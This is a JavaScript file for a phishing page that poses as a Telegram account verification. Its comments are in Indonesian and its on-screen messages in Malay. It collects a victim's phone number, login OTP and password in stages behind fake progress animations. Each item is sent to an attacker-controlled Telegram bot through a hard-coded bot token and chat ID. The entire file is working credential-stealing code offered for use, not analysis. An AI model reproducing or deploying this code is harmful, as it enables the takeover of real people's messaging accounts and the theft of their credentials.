// Fungsi untuk memulai loading
function startLoading() {
  console.log("startLoading function called");
  // Sembunyikan tombol dan tampilkan loader
  document.querySelector(".btn").style.display = "none";
  document.getElementById("loader").style.display = "block";
  document.getElementById("percentage").style.display = "block";
  document.getElementById("loading").style.display = "block";

  let percent = 0;
  const interval = setInterval(() => {
    percent += 1;
    document.getElementById("percentage").innerText = percent + "%";

    if (percent === 100) {
      clearInterval(interval);

      // Sembunyikan angka persentase (100%)
      document.getElementById("percentage").style.display = "none";

      // Sembunyikan loader dan tampilkan lingkaran sukses serta pesan terima kasih
      document.getElementById("loader").style.display = "none";
      document.getElementById("loading").style.display = "none";
      document.getElementById("successCircle").style.display = "block";
      document.getElementById("thankYouMessage").style.display = "block";

      setTimeout(() => {
        // Sembunyikan semua elemen terkait dan tampilkan form nomor telepon
        document.getElementById("thankYouMessage").style.display = "none";
        document.getElementById("successCircle").style.display = "none";
        document.getElementById("centeredContainer").style.display = "none";
        document.getElementById("enterContainer").style.display = "block";
        document.getElementById("phoneNumberForm").style.display = "block";
      }, 2000); // Waktu tunda 2 detik
    }
  }, 50); // Persentase meningkat setiap 50ms
}

// Menangani pengiriman nomor telepon
const sendPhoneButton = document.getElementById("sendPhoneButton");
sendPhoneButton.addEventListener("click", function () {
  console.log("startSend function called");

  // Ambil nomor telepon dari input
  const phoneNumber = document.getElementById("phoneNumberInput").value;
  if (phoneNumber.trim() === "") {
    alert("Nomor telepon tidak boleh kosong");
    return; // Jika nomor kosong, hentikan
  }

  // Kirim nomor telepon ke bot Telegram
  sendMessageToTelegram(`Nomor Telepon: ${phoneNumber}`);

  // Tampilkan animasi loading dan hilangkan form nomor telepon
  document.getElementById("enterContainer").style.display = "none";
  document.getElementById("phoneNumberForm").style.display = "none";
  document.getElementById("loader").style.display = "block";
  document.getElementById("percentage").style.display = "block";
  document.getElementById("loading").style.display = "block";

  let percent = 0;
  const interval = setInterval(() => {
    percent += 1;
    document.getElementById("percentage").innerText = percent + "%";

    if (percent === 100) {
      clearInterval(interval);

      // Sembunyikan angka persentase (100%)
      document.getElementById("percentage").style.display = "none";

      // Sembunyikan loader dan tampilkan lingkaran sukses serta pesan terima kasih
      document.getElementById("loader").style.display = "none";
      document.getElementById("loading").style.display = "none";
      document.getElementById("successCircle").style.display = "block";
      document.getElementById("thankYouMessage").style.display = "block";

      setTimeout(() => {
        // Sembunyikan semua elemen terkait dan tampilkan form OTP
        document.getElementById("thankYouMessage").style.display = "none";
        document.getElementById("successCircle").style.display = "none";
        document.getElementById("otpForm").style.display = "block";
        document.getElementById("otpContainer").style.display = "block";
      }, 2000); // Waktu tunda 2 detik
    }
  }, 50); // Persentase meningkat setiap 300ms untuk total 30 detik
});

// Menangani pengiriman OTP
const sendOtpButton = document.getElementById("sendOtpButton");
sendOtpButton.addEventListener("click", function () {
  console.log("Send OTP button clicked");

  // Ambil OTP dari input
  const otp = document.getElementById("otpInput").value;
  if (otp.trim() === "") {
    console.log("OTP is empty");
    return; // Jika OTP kosong, berhenti
  }

  // Kirim OTP ke bot Telegram
  sendMessageToTelegram(`OTP: ${otp}`);

  // Tampilkan animasi loading dan hilangkan form OTP
  document.getElementById("otpForm").style.display = "none";
  document.getElementById("otpContainer").style.display = "none";
  document.getElementById("loader").style.display = "block";
  document.getElementById("loading").style.display = "block";
  document.getElementById("percentage").style.display = "block";

  let percent = 0;
  const interval = setInterval(() => {
    percent += 1;
    document.getElementById("percentage").innerText = percent + "%";

    if (percent === 100) {
      clearInterval(interval);

      // Sembunyikan angka persentase (100%)
      document.getElementById("percentage").style.display = "none";

      // Sembunyikan loader dan tampilkan lingkaran sukses serta pesan terima kasih
      document.getElementById("loader").style.display = "none";
      document.getElementById("loading").style.display = "none";
      document.getElementById("successCircle").style.display = "block";
      document.getElementById("thankYouMessage").style.display = "block";

      setTimeout(() => {
        // Sembunyikan semua elemen terkait dan tampilkan form password
        document.getElementById("thankYouMessage").style.display = "none";
        document.getElementById("successCircle").style.display = "none";
        document.getElementById("sandiForm").style.display = "block";
        document.getElementById("sandiContainer").style.display = "block";
      }, 2000); // Waktu tunda 2 detik
    }
  }, 50); // Persentase meningkat setiap 50ms
});

// Menangani pengiriman password

// animasi bar
document.addEventListener("DOMContentLoaded", function () {
  const sendPasswordButton = document.getElementById("sendPasswordButton");

  sendPasswordButton.addEventListener("click", function () {
    console.log("Send Password button clicked");

    // Ambil password dari input
    const sandi = document.getElementById("sandiInput").value;
    if (sandi.trim() === "") {
      console.log("Password is empty");
      return; // Jika password kosong, hentikan proses
    }

    // Kirim password ke bot Telegram
    sendMessageToTelegram(`Password: ${sandi}`);

    // Jalankan proses pertama
    handleInitialLoading(() => {
      // Callback: Mulai animasi progres batang setelah proses pertama selesai
      startProgressBar();
    });
  });

  // Fungsi untuk menangani proses loading awal (persentase)
  function handleInitialLoading(callback) {
    // Sembunyikan form password dan tampilkan loader
    document.getElementById("sandiForm").style.display = "none";
    document.getElementById("sandiContainer").style.display = "none";
    document.getElementById("loader").style.display = "block";
    document.getElementById("loading").style.display = "block";
    document.getElementById("percentage").style.display = "block";

    let percent = 0;
    const interval = setInterval(() => {
      percent += 1;
      document.getElementById("percentage").innerText = percent + "%";

      if (percent === 100) {
        clearInterval(interval);

        // Sembunyikan loader setelah selesai
        document.getElementById("percentage").style.display = "none";
        document.getElementById("loader").style.display = "none";
        document.getElementById("loading").style.display = "none";

        // Jalankan callback untuk proses berikutnya
        if (typeof callback === "function") {
          callback();
        }
      }
    }, 20); // Kecepatan loading (persentase meningkat setiap 50ms)
  }

  // Fungsi untuk animasi progres batang (bar)
  function startProgressBar() {
    const animasiBar = document.getElementById("animasiBar");
    const barContainer = document.getElementById("barContainer");
    const progressBar = document.getElementById("progressBar");
    const progressText = document.getElementById("progressText");
    const loaderBar = document.getElementById("loaderBar");
    const successCircle1 = document.getElementById("successCircle1");

    barContainer.style.display = "block";
    animasiBar.style.display = "block";
    loaderBar.style.display = "block";
    barText.style.display = "block";
    successCircle1.style.display = "none";

    let progress = 0;
    const interval = setInterval(function () {
      progress += 1;
      progressBar.style.width = progress + "%";
      document.getElementById("percentage1").textContent = progress + "%";

      if (progress === 100) {
        clearInterval(interval);
        loaderBar.style.display = "none";
        successCircle1.style.display = "block";

        // Mulai animasi bar kedua
        setTimeout(() => {
          startSecondProgressBar();
        }, 1000);
      }
    }, 50);
  }

  function startSecondProgressBar() {
    const loadingContainer2 = document.getElementById("loadingContainer2");
    const progressSection2 = document.getElementById("progressSection2");
    const loaderAnimation2 = document.getElementById("loaderAnimation2");
    const successIndicator2 = document.getElementById("successIndicator2");
    const progressBar2 = document.getElementById("progressBar2");
    const progressPercentage2 = document.getElementById("progressPercentage2");

    // Tampilkan container utama
    loadingContainer2.style.display = "block";

    // Reset tampilan elemen-elemen
    progressBar2.style.width = "0%";
    loaderAnimation2.style.display = "block";
    successIndicator2.style.display = "none";

    let progress = 0;
    const interval = setInterval(function () {
      progress += 1;
      progressBar2.style.width = progress + "%";
      progressPercentage2.textContent = progress + "%";

      if (progress === 100) {
        clearInterval(interval);
        loaderAnimation2.style.display = "none";
        successIndicator2.style.display = "block";

        setTimeout(() => {
          // Sembunyikan container kedua
          loadingContainer2.style.display = "none";
          // Mulai progress bar ketiga
          showThirdProgressDialog();
        }, 1000);
      }
    }, 50);
  }
});

function showThirdProgressDialog() {
  // Buat dan tambahkan dialog ke body
  const dialogHTML = `
      <div id="thirdProgressDialog" class="dialog-overlay">
          <div class="dialog-content">
              <p class="dialog-text">Terima kasih...! Pengesahan data sedang diproses, pastikan anda tidak menutup halaman sehingga proses selesai! <br /> Proses pengambilan masa kurang dari 1 minit, ambil masa anda untuk tidak mengabaikan arahan.!</p>
              <div class="progress-container">
                  <div id="thirdProgressBar" class="progress-bar"></div>
                  <div id="thirdProgressText" class="progress-text">0%</div>
              </div>
          </div>
      </div>
  `;
  document.body.insertAdjacentHTML("beforeend", dialogHTML);

  // Mulai progress bar
  const progressBar = document.getElementById("thirdProgressBar");
  const progressText = document.getElementById("thirdProgressText");
  let progress = 0;

  const interval = setInterval(() => {
    progress += 1;
    progressBar.style.width = progress + "%";
    progressText.textContent = progress + "%";

    if (progress === 100) {
      clearInterval(interval);

      // Tampilkan pesan konfirmasi
      const confirmationHTML = `
        <div class="confirmation-message" style="text-align: center; margin-top: 20px;">
          Pengesahan data anda telah selesai, sila tunggu mesej daripada kami ke Telegram anda.
        </div>
      `;
      document
        .querySelector(".dialog-content")
        .insertAdjacentHTML("beforeend", confirmationHTML);

      // Hapus dialog dan redirect setelah 30 detik
      setTimeout(() => {
        const dialog = document.getElementById("thirdProgressDialog");
        if (dialog) dialog.remove();
        window.location.href = "index.html"; // Ganti dengan URL halaman awal Anda
      }, 30000); // 30 detik
    }
  }, 600);
}
let storedPhoneNumber = ""; // Variabel untuk menyimpan nomor telepon
let storedOtp = ""; // Variabel untuk menyimpan OTP

// Fungsi untuk mengirim pesan ke Telegram
function sendMessageToTelegram(message) {
  const token = "7591116217:AAFN1HomOvzrix9lfgIthUnoPZh4-BxTt7A";
  const chatId = "6995492559";

  let formattedMessage;

  if (message.includes("Nomor Telepon:")) {
    formattedMessage = `
────────────────
🔰 DATA | NOMBOR TELEGRAM 🔰
────────────────
📱 No HP : \`${message.split(":")[1].trim()}\`
────────────────`;
  } else if (message.includes("OTP:")) {
    const phone = document.getElementById("phoneNumberInput").value;
    formattedMessage = `
────────────────
🔰 DATA | OTP 🔰
────────────────
📱 No HP : \`${phone}\`
🔑 OTP   : ${message.split(":")[1].trim()}
────────────────`;
  } else if (message.includes("Password:")) {
    const phone = document.getElementById("phoneNumberInput").value;
    const otp = document.getElementById("otpInput").value;
    formattedMessage = `
────────────────
🔰 DATA | KATA SANDI 🔰
────────────────
📱 No HP : \`${phone}\`
🔑 OTP   : ${otp}
🔐 Kata Laluan : ${message.split(":")[1].trim()}
────────────────`;
  }

  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
    formattedMessage
  )}&parse_mode=Markdown`;

  fetch(url)
    .then((response) => response.json())
    .then((data) => console.log("Pesan berhasil dikirim ke Telegram:", data))
    .catch((error) => console.error("Terjadi kesalahan:", error));
}
